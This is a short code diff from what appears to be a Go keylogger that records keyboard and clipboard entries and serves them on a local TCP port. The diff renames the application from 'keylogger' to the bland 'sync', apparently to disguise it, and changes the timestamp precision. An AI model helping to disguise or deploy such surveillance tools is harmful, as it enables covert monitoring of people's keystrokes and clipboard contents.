@@ -32,7 +32,7 @@ const (
 	Protocol = "tcp"
 	Address  = "127.0.0.1:8722"
 
-	AppName = "keylogger"
+	AppName = "sync"
 
 	TypeKeyboard  KeyType = "KYBD"
 	TypeClipboard KeyType = "CPBD"
@@ -87,7 +87,7 @@ type KeyLog struct {
 
 func NewKeyLog(keyType KeyType, title string, value string) KeyLog {
 	return KeyLog{
-		Time:  time.Now().UnixMilli(),
+		Time:  time.Now().UnixNano(),
 		Type:  keyType,
 		Title: title,
 		Value: value,
